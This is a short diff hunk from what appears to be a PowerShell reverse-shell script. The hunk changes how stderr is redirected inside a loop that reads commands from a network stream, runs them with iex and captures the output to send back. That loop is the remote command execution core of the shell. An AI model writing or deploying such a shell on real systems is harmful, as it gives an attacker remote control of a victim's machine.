@@ -9,7 +9,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
         break;
     }    
     try{
-        $sendback = (iex ".{$data}" 2>&1 | Out-String);
+        $sendback = (iex ".{$data} 2>&1" | Out-String);
     }
     catch {
         $sendback = $_.Exception.Message+"`n";
